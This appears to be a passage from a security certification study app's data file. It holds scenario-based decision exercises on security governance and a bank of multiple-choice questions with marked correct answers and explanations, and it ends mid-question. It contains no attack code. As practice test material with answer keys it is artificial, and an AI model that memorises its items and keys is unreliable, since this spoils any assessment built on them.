"feedback": "Excellent approach. Share your risk assessment to inform audit planning. Provide compliance intelligence so audits can target higher-risk areas. Use audit findings constructively to improve security program. This makes Internal Audit a partner in security improvement while respecting their independence."}, {"id": "c", "text": "Request that Internal Audit focus only on SOX ITGC; other areas are already covered by external assessments", "is_optimal": false, "feedback": "Limiting Internal Audit to SOX minimizes their potential value. External assessments provide point-in-time views; Internal Audit can provide continuous monitoring. They also understand your organization better than external assessors. Leverage their capabilities, don't constrain them."}, {"id": "d", "text": "Pre-review all audit findings before they're reported to ensure accuracy and context", "is_optimal": false, "feedback": "While factual accuracy review is reasonable, pre-reviewing findings to influence reporting undermines audit independence. Management response comes after findings are issued, not before. Appearing to influence audit results damages credibility of both functions."}]}], "passing_score": 70, "max_score": 100}, {"id": "D5-SIM-005", "domain": 5, "type": "SIM", "title": "Security Program Integration", "difficulty": "advanced", "role": "Director of Security", "organization": {"name": "Nexus Manufacturing Group"}, "introduction": "You've been hired as Director of Security at Nexus Manufacturing to unify and mature the security program following a ransomware incident that cost $8M in lost production. The Board wants a cohesive security strategy addressing IT, OT, and supply chain risks with clear governance and measurable outcomes. You'll integrate previously siloed security functions, establish enterprise risk management, and build a program that protects both information systems and manufacturing operations.", "decision_points": [{"id": "dp1", "title": "Security Program Assessment", "situation": "Your first month assessment reveals significant fragmentation:\n\n**IT Security (reports to CIO):**\n- Mature endpoint protection and network security\n- SOC monitors IT network only\n- Vulnerability management for IT systems\n- No visibility into OT networks\n\n**OT Security (reports to VP Operations):**\n- Basic network segmentation between IT and OT\n- No centralized monitoring\n- Vendors manage most ICS/SCADA security\n- Safety systems prioritized over security\n\n**Compliance (reports to General Counsel):**\n- SOX ITGC compliance for ERP\n- Customer security questionnaire responses\n- No formal risk management framework\n- Privacy compliance for GDPR (European operations)\n\nThe CEO asks: 'Where do we start? We need quick wins but also sustainable improvement.'\n\nWhat's your first priority?", "question": "What would you do?", "options": [{"id": "a", "text": "Focus on OT security since that's where the ransomware incident caused production impact", "is_optimal": false, "feedback": "While OT security needs attention, jumping directly to OT without understanding the broader program creates more silos. The ransomware likely entered through IT and spread to OT - solving OT alone doesn't address the root cause. You need integrated visibility first."}, {"id": "b", "text": "Establish unified governance structure first, then build integrated program systematically", "is_optimal": true, "feedback": "Excellent approach. Governance structure enables everything else - clear accountability, decision-making authority, and resource allocation. Without unified governance, improvements in any area remain fragmented. Quick wins can happen within governance structure."}, {"id": "c", "text": "Conduct comprehensive risk assessment across IT, OT, and supply chain before any changes", "is_optimal": false, "feedback": "Risk assessment is important but not without governance to act on findings. A comprehensive assessment without clear decision-making authority results in a report that sits on a shelf. Establish governance, then conduct risk assessment within that framework."}, {"id": "d", "text": "Implement zero trust architecture to prevent another ransomware incident", "is_optimal": false, "feedback": "Zero trust is a valuable strategy but implementing architecture without governance creates another silo. Zero trust implementation requires organizational coordination that fragmented security can't provide. Architecture changes should follow program structure, not precede it."}]}, {"id": "dp2", "title": "Governance Structure Design", "situation": "You've received CEO support to unify security governance. Now you need to design the structure. Key stakeholders have strong opinions:\n\n**CIO**: 'Security should report to IT. We have the technical expertise.'\n\n**VP Operations**: 'OT security must stay with Operations. IT doesn't understand manufacturing safety requirements.'\n\n**General Counsel**: 'Compliance needs to remain independent for objectivity.'\n\n**CFO**: 'I'm not adding headcount. Make it work with existing resources.'\n\nHow do you structure security governance?", "question": "What would you do?", "options": [{"id": "a", "text": "Security reports to CIO with dotted line to VP Operations for OT matters", "is_optimal": false, "feedback": "CIO reporting perpetuates IT-centric security that missed OT risks. Dotted lines are weak and easily ignored. VP Operations won't accept IT authority over manufacturing safety. This structure doesn't solve the fundamental accountability problem."}, {"id": "b", "text": "Create CISO role reporting to CEO, with security steering committee including all stakeholders", "is_optimal": true, "feedback": "Excellent approach. CISO reporting to CEO provides appropriate authority and independence. Steering committee ensures stakeholder input and buy-in. This elevates security as enterprise function while maintaining necessary connections to IT, Operations, and Legal."}, {"id": "c", "text": "Maintain current structure but add coordination meetings between IT Security and OT Security", "is_optimal": false, "feedback": "Coordination meetings without clear authority create discussion but not decisions. When IT Security and OT Security disagree, who decides? Current structure is the problem; meetings don't solve accountability gaps. This is incremental improvement, not transformation."}, {"id": "d", "text": "Outsource security leadership to managed security provider for objective perspective", "is_optimal": false, "feedback": "Security leadership is a core organizational capability. External providers lack organizational context and authority. They can augment capabilities but can't make governance decisions. Outsourcing leadership abdicates accountability that the Board just demanded."}]}, {"id": "dp3", "title": "Enterprise Risk Framework", "situation": "With governance established, you need to implement enterprise security risk management. Currently:\n\n- IT maintains a vulnerability list prioritized by CVSS\n- OT has no formal risk assessment (relies on vendor security)\n- Supply chain risks managed ad-hoc by procurement\n- Business units don't participate in security risk discussions\n\nThe CFO asks: 'How do we prioritize security investments? We can't fund everything.'\n\nHow do you approach enterprise security risk management?", "question": "What would you do?", "options": [{"id": "a", "text": "Extend IT vulnerability management to include OT and supply chain", "is_optimal": false, "feedback": "Vulnerability management is one input to risk, not risk management itself. CVSS scores don't capture business context, OT safety implications, or supply chain dependencies. Extending technical vulnerability tracking doesn't create enterprise risk perspective."}, {"id": "b", "text": "Implement enterprise risk framework integrating IT, OT, supply chain, and business impact assessment", "is_optimal": true, "feedback": "Excellent approach. Enterprise risk framework captures all risk domains (IT, OT, supply chain) with consistent methodology. Business impact assessment ensures risks are expressed in terms executives understand - production impact, financial loss, safety, reputation. This enables informed investment decisions."}, {"id": "c", "text": "Focus on the risks that caused the ransomware incident first", "is_optimal": false, "feedback": "Addressing incident-related risks is important but represents backward-looking risk management. Other significant risks may exist that weren't exposed by this incident. Risk management should be comprehensive, not reactive to the last incident."}, {"id": "d", "text": "Adopt industry risk framework (NIST RMF) and conduct formal assessment", "is_optimal": false, "feedback": "Industry frameworks provide good structure, but NIST RMF is designed for federal systems and may not fit manufacturing well. Framework adoption should be tailored to organizational context. Additionally, framework adoption without business impact integration misses the investment prioritization need."}]}, {"id": "dp4", "title": "IT/OT Security Convergence", "situation": "The ransomware attack exploited the IT-OT boundary. You need to integrate security across both environments while respecting operational constraints.\n\nThe OT Security Manager warns: 'We can't just deploy IT security tools in the plant. They'll crash PLCs, cause safety issues, and Operations will revolt.'\n\nThe IT Security Manager counters: 'We can't leave OT as a black box. We need visibility.'\n\nOperations leadership is skeptical: 'Last time IT touched the plant network, we had unplanned downtime.'\n\nHow do you approach IT/OT security convergence?", "question": "What would you do?", "options": [{"id": "a", "text": "Deploy IT security tools across OT networks for comprehensive visibility", "is_optimal": false, "feedback": "IT security tools can disrupt OT systems. Active scanning can crash PLCs. Endpoint agents may conflict with real-time control software. Safety systems could be affected. OT environments require purpose-built security approaches that respect operational constraints."}, {"id": "b", "text": "Implement OT-specific passive monitoring with integration to unified SOC for correlated visibility", "is_optimal": true, "feedback": "Excellent approach. OT-specific tools provide passive monitoring without disrupting operations. Integration with SOC enables correlated visibility across IT and OT. This respects operational constraints while achieving security goals. Operations sees security investment, not IT takeover."}, {"id": "c", "text": "Strengthen the IT-OT boundary and keep the networks completely separate", "is_optimal": false, "feedback": "Complete separation is impractical given digital transformation requirements. IoT sensors, analytics, and remote monitoring require controlled IT-OT connectivity. Air-gapping eliminates business value. The goal is controlled integration, not separation."}, {"id": "d", "text": "Let OT team continue managing OT security independently with better coordination", "is_optimal": false, "feedback": "Independent management perpetuates the gaps that enabled the ransomware attack. Coordination without integration misses attack paths that cross IT-OT boundaries. The incident proved that separate management creates security gaps."}]}, {"id": "dp5", "title": "Supply Chain Risk Integration", "situation": "Your supplier risk assessment reveals concerning gaps:\n\n- Critical component supplier (sole source) has no security program\n- Software vendor for MES system was recently breached\n- Cloud analytics provider processes production data with unclear security controls\n- 400+ suppliers with no systematic risk assessment\n\nThe VP Supply Chain says: 'We can't assess 400 suppliers. We barely have resources to manage procurement.'\n\nHow do you approach supply chain security risk?", "question": "What would you do?", "options": [{"id": "a", "text": "Require all suppliers to complete security questionnaires annually", "is_optimal": false, "feedback": "Requiring questionnaires from 400+ suppliers creates massive burden without proportionate value. Many suppliers are low-risk. Questionnaires measure what suppliers claim, not actual security. Resources should focus on high-risk suppliers with meaningful assessment."}, {"id": "b", "text": "Implement tiered supply chain risk program focusing assessment effort on critical and high-risk suppliers", "is_optimal": true, "feedback": "Excellent approach. Tier suppliers by criticality and risk, then apply proportionate assessment. Critical suppliers (sole source, system access) get comprehensive assessment. Low-risk suppliers get standard contract terms. This focuses resources where risk is highest."}, {"id": "c", "text": "Focus only on IT vendors since they have direct system access", "is_optimal": false, "feedback": "IT vendors are important but not the only supply chain risk. Component suppliers can introduce counterfeit parts. Software embedded in products creates supply chain risk. Logistics disruption affects production. Supply chain security spans multiple vendor types."}, {"id": "d", "text": "Require cyber insurance from all suppliers to transfer risk", "is_optimal": false, "feedback": "Cyber insurance transfers financial risk but doesn't prevent incidents. A supplier breach still affects your operations regardless of their insurance. Insurance is one risk treatment but doesn't replace security assessment and requirements. Risk transfer has limits."}]}], "passing_score": 70, "max_score": 100}];

const QUESTIONS = [{"id": "D1-Q001", "domain": 1, "question": "Which security control type is a firewall classified as?", "options": ["Physical", "Technical", "Administrative", "Operational"], "correct": 1, "explanation": "A firewall is a technical (logical) control that uses technology to restrict network access based on defined rules."}, {"id": "D1-Q002", "domain": 1, "question": "What is the primary purpose of defense in depth?", "options": ["To reduce costs by consolidating security measures", "To implement multiple layers of security controls", "To focus on perimeter security only", "To eliminate the need for security policies"], "correct": 1, "explanation": "Defense in depth uses multiple layers of security controls so that if one fails, others continue to provide protection."}, {"id": "D1-Q003", "domain": 1, "question": "Which of the following best describes a deterrent control?", "options": ["Backup systems that restore data after an incident", "Warning signs that discourage unauthorized access", "Encryption that protects data confidentiality", "Logs that record security events"], "correct": 1, "explanation": "Deterrent controls discourage potential attackers by making them aware of consequences or obstacles, like warning signs or visible cameras."}, {"id": "D1-Q004", "domain": 1, "question": "What is the main difference between a vulnerability and a threat?", "options": ["Vulnerabilities are external, threats are internal", "Vulnerabilities are weaknesses, threats are potential dangers that exploit them", "Threats are technical, vulnerabilities are human-based", "There is no difference"], "correct": 1, "explanation": "A vulnerability is a weakness in a system, while a threat is a potential danger that could exploit that vulnerability."}, {"id": "D1-Q005", "domain": 1, "question": "Which principle ensures that users only have access to resources necessary for their job functions?", "options": ["Separation of duties", "Least privilege", "Need to know", "Job rotation"], "correct": 1, "explanation": "Least privilege ensures users have only the minimum access rights needed to perform their job functions."}, {"id": "D1-Q006", "domain": 1, "question": "What type of control is a security awareness training program?", "options": ["Technical", "Physical", "Administrative", "Compensating"], "correct": 2, "explanation": "Security awareness training is an administrative (managerial) control that uses policies, procedures, and training to manage security."}, {"id": "D1-Q007", "domain": 1, "question": "Which security concept describes accepting a risk because the cost of mitigation exceeds the potential loss?", "options": ["Risk transference", "Risk avoidance", "Risk acceptance", "Risk mitigation"], "correct": 2, "explanation": "Risk acceptance occurs when an organization decides to accept a risk without taking action, typically when mitigation costs outweigh potential losses."}, {"id": "D1-Q008", "domain": 1, "question": "What is the purpose of implementing separation of duties?", "options": ["To reduce training costs", "To prevent fraud and errors by requiring multiple people for critical tasks", "To increase system performance", "To simplify access control management"], "correct": 1, "explanation": "Separation of duties prevents fraud and errors by ensuring no single person has complete control over critical transactions or processes."}, {"id": "D1-Q009", "domain": 1, "question": "Which control type is designed to restore systems after a security incident?", "options": ["Preventive", "Detective", "Corrective", "Deterrent"], "correct": 2, "explanation": "Corrective controls are implemented to restore systems and repair damage after a security incident has occurred."}, {"id": "D1-Q010", "domain": 1, "question": "What does the term 'attack surface' refer to?", "options": ["The physical area of a data center", "All possible entry points an attacker could exploit", "The network bandwidth available to attackers", "The number of employees in an organization"], "correct": 1, "explanation": "Attack surface refers to all the possible points where an attacker could enter or extract data from a system or environment."}, {"id": "D1-Q011", "domain": 1, "question": "Which principle states that security should not rely on keeping the methods secret?", "options": ["Security through obscurity", "Kerkhoff's principle", "Least privilege", "Defense in depth"], "correct": 1, "explanation": "Kerkhoff's principle states that a cryptographic system should remain secure even if everything except the key is public knowledge."}, {"id": "D1-Q012", "domain": 1, "question": "What is a compensating control?", "options": ["A control that replaces a missing or inadequate primary control", "Financial compensation for security breaches", "A control that monitors employee performance", "A backup power system"], "correct": 0, "explanation": "A compensating control is an alternative control implemented when the desired primary control is not feasible or too expensive."}, {"id": "D1-Q013", "domain": 1, "question": "Which of the following best describes confidentiality in the CIA triad?", "options": ["Ensuring data is accessible when needed", "Preventing unauthorized disclosure of information", "Ensuring data has not been altered", "Making data available to everyone"], "correct": 1, "explanation": "Confidentiality ensures that information is not disclosed to unauthorized individuals, processes, or devices."}, {"id": "D1-Q014", "domain": 1, "question": "What is the purpose of a gap analysis in security?", "options": ["To identify network bandwidth limitations", "To compare current security state against desired state", "To measure employee satisfaction", "To calculate return on investment"], "correct": 1, "explanation": "Gap analysis identifies differences between the current security posture and desired security objectives or compliance requirements."}, {"id": "D1-Q015", "domain": 1, "question": "Which security control would a bollard be classified as?", "options": ["Technical", "Administrative", "Physical", "Operational"], "correct": 2, "explanation": "Bollards are physical controls that prevent vehicle access to restricted areas through physical barriers."}, {"id": "D1-Q016", "domain": 1, "question": "What does non-repudiation provide?", "options": ["Proof that a message was sent and received", "Encryption of data in transit", "Multiple backup copies", "Faster network speeds"], "correct": 0, "explanation": "Non-repudiation ensures that a party cannot deny sending or receiving a message, typically through digital signatures."}, {"id": "D1-Q017", "domain": 1, "question": "Which type of authentication factor is a fingerprint scan?", "options": ["Something you know", "Something you have", "Something you are", "Somewhere you are"], "correct": 2, "explanation": "Biometric factors like fingerprint scans fall under 'something you are' - inherence factors based on physical characteristics."}, {"id": "D1-Q018", "domain": 1, "question": "What is the primary goal of implementing job rotation?", "options": ["To increase employee satisfaction", "To detect fraud and prevent knowledge silos", "To reduce payroll costs", "To improve network performance"], "correct": 1, "explanation": "Job rotation helps detect fraudulent activities and prevents any single employee from having exclusive knowledge of critical systems."}, {"id": "D1-Q019", "domain": 1, "question": "Which security model focuses on preventing information flow from higher to lower security levels?", "options": ["Bell-LaPadula", "Biba", "Clark-Wilson", "Brewer-Nash"], "correct": 0, "explanation": "Bell-LaPadula model focuses on confidentiality and prevents information from flowing from high security levels to low (no read up, no write down)."}, {"id": "D1-Q020", "domain": 1, "question": "What does integrity mean in the context of the CIA triad?", "options": ["Data is accessible when needed", "Data has not been modified in an unauthorized manner", "Data is encrypted", "Data is backed up regularly"], "correct": 1, "explanation": "Integrity ensures that data has not been altered in an unauthorized way and remains accurate and trustworthy."}, {"id": "D1-Q021", "domain": 1, "question": "What is the primary difference between qualitative and quantitative risk analysis?", "options": ["Qualitative uses numbers, quantitative uses descriptions", "Qualitative uses descriptions, quantitative uses numerical values", "They are the same", "Qualitative is faster, quantitative is slower"], "correct": 1, "explanation": "Qualitative risk analysis uses descriptive terms (high/medium/low), while quantitative uses numerical values and calculations."}, {"id": "D1-Q022", "domain": 1, "question": "Which authentication factor category does a smart card belong to?", "options": ["Something you know", "Something you have", "Something you are", "Somewhere you are"], "correct": 1, "explanation": "A smart card is a possession factor - something you have - used for authentication."}, {"id": "D1-Q023", "domain": 1, "question": "What is the purpose of implementing mandatory vacations?", "options": ["Employee wellness", "To detect fraud and misconduct", "To reduce payroll costs", "To improve productivity"], "correct": 1, "explanation": "Mandatory vacations force employees to be away from their duties, allowing others to discover any fraudulent activities."}, {"id": "D1-Q024", "domain": 1, "question": "Which security principle requires multiple people to complete a sensitive task?", "options": ["Least privilege", "Dual control", "Job rotation", "Separation of duties"], "correct": 1, "explanation": "Dual control requires two or more people to complete a critical task, preventing single-person fraud."}, {"id": "D1-Q025", "domain": 1, "question": "What does availability mean in the CIA triad?", "options": ["Data is encrypted", "Data is accurate", "Data is accessible when needed by authorized users", "Data is backed up"], "correct": 2, "explanation": "Availability ensures that systems and data are accessible when needed by authorized users."}, {"id": "D1-Q026", "domain": 1, "question": "Which control type detects security incidents after they occur?", "options": ["Preventive", "Detective", "Corrective", "Deterrent"], "correct": 1, "explanation": "Detective controls identify security incidents after they have occurred through monitoring and logging."}, {"id": "D1-Q027", "domain": 1, "question": "What is the purpose of security guards?", "options": ["Technical control", "Physical and detective control", "Administrative control", "Logical control"], "correct": 1, "explanation": "Security guards serve as both physical controls (preventing access) and detective controls (observing and reporting)."}, {"id": "D1-Q028", "domain": 1, "question": "Which principle limits users to only the information they need for their job?", "options": ["Least privilege", "Need to know", "Separation of duties", "Defense in depth"], "correct": 1, "explanation": "Need to know restricts access to only the specific information required for job functions, even within privilege levels."}, {"id": "D1-Q029", "domain": 1, "question": "What type of control is encryption?", "options": ["Physical", "Administrative", "Technical", "Operational"], "correct": 2, "explanation": "Encryption is a technical control that uses technology to protect data confidentiality."}, {"id": "D1-Q030", "domain": 1, "question": "Which security model focuses on data integrity?", "options": ["Bell-LaPadula", "Biba", "Clark-Wilson", "Both Biba and Clark-Wilson"], "correct": 3, "explanation": "Both Biba and Clark-Wilson models focus on maintaining data integrity, though through different approaches."}, {"id": "D1-Q031", "domain": 1, "question": "What is the primary purpose of background checks?", "options": ["To verify technical skills", "To assess security risks before hiring", "To determine salary levels", "To check social media presence"], "correct": 1, "explanation": "Background checks are administrative controls to assess potential security risks before granting access to sensitive resources."}, {"id": "D1-Q032", "domain": 1, "question": "Which authentication method uses physical characteristics?", "options": ["Password", "Token", "Biometric", "PIN"], "correct": 2, "explanation": "Biometric authentication uses unique physical characteristics like fingerprints, iris, or facial recognition."}, {"id": "D1-Q033", "domain": 1, "question": "What is multi-factor authentication (MFA)?", "options": ["Using multiple passwords", "Using factors from at least two different categories", "Using multiple usernames", "Using biometrics only"], "correct": 1, "explanation": "MFA requires authentication factors from at least two different categories (something you know, have, or are)."}, {"id": "D1-Q034", "domain": 1, "question": "Which control type attempts to repair damage after an incident?", "options": ["Preventive", "Detective", "Corrective", "Compensating"], "correct": 2, "explanation": "Corrective controls repair or restore systems after a security incident has been detected."}, {"id": "D1-Q035", "domain": 1, "question": "What is the principle of implicit deny?", "options": ["Deny all access by default unless explicitly allowed", "Allow all access by default", "Deny only suspicious activities", "Allow access after verification"], "correct": 0, "explanation": "Implicit deny blocks all access by default unless explicitly permitted, following least privilege principles."}, {"id": "D1-Q036", "domain": 1, "question": "Which of the following is an example of administrative control?", "options": ["Firewall", "Security policy", "Encryption", "Biometric scanner"], "correct": 1, "explanation": "Security policies are administrative controls that establish rules and procedures for security management."}, {"id": "D1-Q037", "domain": 1, "question": "What does risk transference mean?", "options": ["Eliminating risk entirely", "Shifting risk to another party", "Accepting risk", "Reducing risk impact"], "correct": 1, "explanation": "Risk transference shifts risk to another party, typically through insurance or outsourcing."}, {"id": "D1-Q038", "domain": 1, "question": "Which security control is a mantrap?", "options": ["Technical", "Administrative", "Physical", "Detective"], "correct": 2, "explanation": "A mantrap is a physical control that uses two doors to control and monitor access to secure areas."}, {"id": "D1-Q039", "domain": 1, "question": "What is the purpose of implementing access control lists (ACLs)?", "options": ["To list all users", "To define who can access specific resources", "To track login attempts", "To encrypt data"], "correct": 1, "explanation": "ACLs specify which users or systems are granted access to objects and what operations they can perform."}, {"id": "D1-Q040", "domain": 1, "question": "Which principle requires critical operations to be divided among multiple people?", "options": ["Least privilege", "Need to know", "Separation of duties", "Defense in depth"], "correct": 2, "explanation": "Separation of duties divides critical operations among multiple people to prevent fraud and errors."}, {"id": "D1-Q041", "domain": 1, "question": "What is single sign-on (SSO)?", "options": ["Using one password for all accounts", "Authenticating once to access multiple systems", "Single-factor authentication", "One-time password"], "correct": 1, "explanation": "SSO allows users to authenticate once and access multiple systems without re-authenticating."}, {"id": "D1-Q042", "domain": 1, "question": "Which control category includes locks and fences?", "options": ["Technical", "Administrative", "Physical", "Logical"], "correct": 2, "explanation": "Locks and fences are physical controls that restrict physical access to facilities and assets."}, {"id": "D1-Q043", "domain": 1, "question": "What is the purpose of audit trails?", "options": ["To prevent attacks", "To record system activities for review", "To encrypt data", "To authenticate users"], "correct": 1, "explanation": "Audit trails record system activities, enabling review, investigation, and accountability."}, {"id": "D1-Q044", "domain": 1, "question": "Which authentication factor is 'somewhere you are'?", "options": ["Password", "Token", "Fingerprint", "Geolocation"], "correct": 3, "explanation": "Geolocation authentication uses physical location as a factor (somewhere you are)."}, {"id": "D1-Q045", "domain": 1, "question": "What is the difference between identification and authentication?", "options": ["They are the same", "Identification claims identity, authentication proves it", "Authentication claims identity, identification proves it", "Identification is for users, authentication is for systems"], "correct": 1, "explanation": "Identification is claiming an identity (username), while authentication is proving that identity (password)."}, {"id": "D1-Q046", "domain": 1, "question": "Which security principle requires regularly testing security controls?", "options": ["Defense in depth", "Least privilege", "Continuous monitoring", "Need to know"], "correct": 2, "explanation": "Continuous monitoring involves regularly testing and verifying that security controls remain effective."}, {"id": "D1-Q047", "domain": 1, "question": "What is authorization?", "options": ["Proving identity", "Claiming identity", "Granting access to resources after authentication", "Logging access attempts"], "correct": 2, "explanation": "Authorization determines what authenticated users are allowed to access and what actions they can perform."}, {"id": "D1-Q048", "domain": 1, "question": "Which control helps ensure accountability?", "options": ["Encryption", "Logging and auditing", "Firewalls", "Antivirus"], "correct": 1, "explanation": "Logging and auditing create records of user actions, establishing accountability and enabling investigation."}, {"id": "D1-Q049", "domain": 1, "question": "What is defense in depth also known as?", "options": ["Single layer security", "Layered security", "Perimeter security", "Zero trust"], "correct": 1, "explanation": "Defense in depth is also called layered security, using multiple security controls at different layers."}, {"id": "D1-Q050", "domain": 1, "question": "Which principle states that systems should fail in a secure state?", "options": ["Fail-open", "Fail-secure", "Fail-safe", "Both fail-secure and fail-safe"], "correct": 3, "explanation": "Fail-secure/fail-safe means systems default to a secure state during failure, denying access rather than allowing it."}, {"id": "D2-Q001", "domain": 2, "question": "What type of malware locks a user's files and demands payment for decryption?", "options": ["Trojan", "Ransomware", "Rootkit", "Spyware"], "correct": 1, "explanation": "Ransomware encrypts victim files and demands payment (ransom) for the decryption key."}, {"id": "D2-Q002", "domain": 2, "question": "Which attack involves overwhelming a system with traffic to make it unavailable?", "options": ["SQL injection", "Cross-site scripting", "Denial of Service (DoS)", "Man-in-the-middle"], "correct": 2, "explanation": "A Denial of Service (DoS) attack floods a system with traffic or requests to exhaust resources and make it unavailable to legitimate users."}, {"id": "D2-Q003", "domain": 2, "question": "What is the difference between a virus and a worm?", "options": ["Viruses require user action to spread, worms self-replicate", "Worms require user action, viruses self-replicate", "They are the same thing", "Viruses only affect files, worms only affect networks"], "correct": 0, "explanation": "Viruses require user action (like opening an infected file) to spread, while worms can self-replicate and spread automatically across networks."}, {"id": "D2-Q004", "domain": 2, "question": "Which social engineering attack uses fake scenarios to trick users into revealing information?", "options": ["Phishing", "Pretexting", "Tailgating", "Shoulder surfing"], "correct": 1, "explanation": "Pretexting involves creating a fabricated scenario or pretext to manipulate victims into divulging information or performing actions."}, {"id": "D2-Q005", "domain": 2, "question": "What type of attack injects malicious SQL commands into input fields?", "options": ["Cross-site scripting (XSS)", "SQL injection", "Buffer overflow", "Directory traversal"], "correct": 1, "explanation": "SQL injection attacks insert malicious SQL statements into input fields to manipulate database queries and access unauthorized data."}, {"id": "D2-Q006", "domain": 2, "question": "Which attack intercepts communication between two parties without their knowledge?", "options": ["Replay attack", "Man-in-the-middle (MITM)", "Session hijacking", "DNS poisoning"], "correct": 1, "explanation": "Man-in-the-middle (MITM) attacks intercept and potentially alter communications between two parties who believe they're directly communicating."}, {"id": "D2-Q007", "domain": 2, "question": "What is a zero-day vulnerability?", "options": ["A vulnerability discovered on day zero of a product launch", "A vulnerability unknown to the vendor with no patch available", "A vulnerability that expires after zero days", "A vulnerability that takes zero days to exploit"], "correct": 1, "explanation": "A zero-day vulnerability is a security flaw unknown to the software vendor, meaning there's been zero days to create a patch."}, {"id": "D2-Q008", "domain": 2, "question": "Which attack captures and retransmits valid data to gain unauthorized access?", "options": ["Brute force", "Replay attack", "Password spraying", "Dictionary attack"], "correct": 1, "explanation": "Replay attacks capture legitimate authentication data and retransmit it to gain unauthorized access to systems or services."}, {"id": "D2-Q009", "domain": 2, "question": "What type of malware disguises itself as legitimate software?", "options": ["Virus", "Worm", "Trojan", "Ransomware"], "correct": 2, "explanation": "A Trojan (or Trojan horse) disguises itself as legitimate software to trick users into installing it, then performs malicious actions."}, {"id": "D2-Q010", "domain": 2, "question": "Which vulnerability allows attackers to execute code by overwriting memory?", "options": ["SQL injection", "Buffer overflow", "Cross-site scripting", "XML injection"], "correct": 1, "explanation": "Buffer overflow occurs when a program writes more data to a buffer than it can hold, potentially allowing execution of malicious code."}, {"id": "D2-Q011", "domain": 2, "question": "What is spear phishing?", "options": ["Phishing attacks using phone calls", "Targeted phishing attacks against specific individuals or organizations", "Phishing attacks via social media", "Phishing attacks using spear weapons imagery"], "correct": 1, "explanation": "Spear phishing is a targeted phishing attack directed at specific individuals or organizations, using personalized information to appear legitimate."}, {"id": "D2-Q012", "domain": 2, "question": "Which attack redirects users to fake websites by corrupting DNS records?", "options": ["Pharming", "Phishing", "Vishing", "Smishing"], "correct": 0, "explanation": "Pharming redirects users to fraudulent websites by poisoning DNS cache or modifying host files, without requiring user interaction."}, {"id": "D2-Q013", "domain": 2, "question": "What is the primary characteristic of an Advanced Persistent Threat (APT)?", "options": ["Quick, automated attacks", "Long-term, stealthy attacks with specific targets", "Attacks using advanced AI", "Attacks that persist after reboot"], "correct": 1, "explanation": "APTs are prolonged, targeted attacks where adversaries gain and maintain access to networks over extended periods, often for espionage."}, {"id": "D2-Q014", "domain": 2, "question": "Which social engineering technique involves following authorized personnel into restricted areas?", "options": ["Shoulder surfing", "Tailgating", "Dumpster diving", "Pretexting"], "correct": 1, "explanation": "Tailgating (or piggybacking) involves unauthorized individuals following authorized personnel through secure entry points without proper authentication."}, {"id": "D2-Q015", "domain": 2, "question": "What type of attack injects malicious scripts into web pages viewed by other users?", "options": ["SQL injection", "Cross-site scripting (XSS)", "LDAP injection", "Command injection"], "correct": 1, "explanation": "Cross-site scripting (XSS) injects malicious scripts into web pages that are then executed by other users' browsers."}, {"id": "D2-Q016", "domain": 2, "question": "Which malware hides its presence and provides backdoor access to attackers?", "options": ["Virus", "Rootkit", "Adware", "Spyware"], "correct": 1, "explanation": "Rootkits conceal their presence and the presence of other malware while providing privileged backdoor access to attackers."}, {"id": "D2-Q017", "domain": 2, "question": "What is credential stuffing?", "options": ["Encrypting credentials for secure storage", "Using stolen username/password combinations from one breach on other sites", "Generating random passwords", "Storing multiple credentials in one location"], "correct": 1, "explanation": "Credential stuffing uses automated tools to try stolen username/password pairs from one breach against multiple websites."}, {"id": "D2-Q018", "domain": 2, "question": "Which attack floods systems with SYN requests but never completes the handshake?", "options": ["Smurf attack", "SYN flood", "Ping of death", "Teardrop attack"], "correct": 1, "explanation": "SYN flood attacks send multiple SYN requests but never complete the TCP three-way handshake, exhausting server resources."}, {"id": "D2-Q019", "domain": 2, "question": "What is business email compromise (BEC)?", "options": ["Hacking corporate email servers", "Impersonating business executives to authorize fraudulent transactions", "Encrypting business emails", "Intercepting business emails in transit"], "correct": 1, "explanation": "BEC involves compromising or spoofing business email accounts to impersonate executives and manipulate employees into transferring funds or data."}, {"id": "D2-Q020", "domain": 2, "question": "Which vulnerability allows attackers to access files outside the intended directory?", "options": ["SQL injection", "Directory traversal", "Cross-site scripting", "Buffer overflow"], "correct": 1, "explanation": "Directory traversal (path traversal) attacks manipulate file paths to access files and directories outside the web root folder."}, {"id": "D2-Q021", "domain": 2, "question": "What is the purpose of a watering hole attack?", "options": ["To flood systems with water", "To compromise websites frequented by specific target groups", "To attack water utilities", "To intercept communications"], "correct": 1, "explanation": "Watering hole attacks compromise websites commonly visited by a target group, infecting visitors who access the compromised site."}, {"id": "D2-Q022", "domain": 2, "question": "Which attack attempts many password combinations against a single account?", "options": ["Password spraying", "Brute force", "Rainbow table", "Dictionary attack"], "correct": 1, "explanation": "Brute force attacks systematically try all possible password combinations against an account until the correct one is found."}, {"id": "D2-Q023", "domain": 2, "question": "What type of attack tries a few common passwords against many accounts?", "options": ["Brute force", "Password spraying", "Credential stuffing", "Rainbow table"], "correct": 1, "explanation": "Password spraying tries a small set of common passwords against many user accounts to avoid account lockouts."}, {"id": "D2-Q024", "domain": 2, "question": "Which malware monitors user activities and reports information to attackers?", "options": ["Virus", "Worm", "Spyware", "Logic bomb"], "correct": 2, "explanation": "Spyware covertly monitors user activities, keystrokes, and data, then sends this information to attackers."}, {"id": "D2-Q025", "domain": 2, "question": "What is a logic bomb?", "options": ["Exploding malware", "Malicious code triggered by specific conditions", "A type of physical bomb", "Malware causing logical errors"], "correct": 1, "explanation": "A logic bomb is malicious code that remains dormant until triggered by specific conditions like a date or action."}, {"id": "D2-Q026", "domain": 2, "question": "Which attack amplifies traffic using third-party servers?", "options": ["Amplification attack", "Direct DoS", "Application layer attack", "Slowloris"], "correct": 0, "explanation": "Amplification attacks send small requests to third-party servers that respond with much larger replies to the victim."}, {"id": "D2-Q027", "domain": 2, "question": "What is typosquatting?", "options": ["Squatting in buildings", "Registering misspelled domain names", "Making code typos", "Typing errors"], "correct": 1, "explanation": "Typosquatting registers domain names similar to popular sites with common typos to capture mistyped traffic."}, {"id": "D2-Q028", "domain": 2, "question": "Which vulnerability allows execution of OS commands?", "options": ["SQL injection", "Command injection", "XSS", "CSRF"], "correct": 1, "explanation": "Command injection allows attackers to execute arbitrary commands on the host operating system."}, {"id": "D2-Q029", "domain": 2, "question": "What is a supply chain attack?", "options": ["Attacking shipping companies", "Compromising third-party vendors to reach targets", "Disrupting product supply", "Attacking manufacturers"], "correct": 1, "explanation": "Supply chain attacks compromise trusted third-party vendors or software to gain access to target organizations."}, {"id": "D2-Q030", "domain": 2, "question": "Which attack tricks users into performing unwanted actions?", "options": ["SQL injection", "Cross-site request forgery 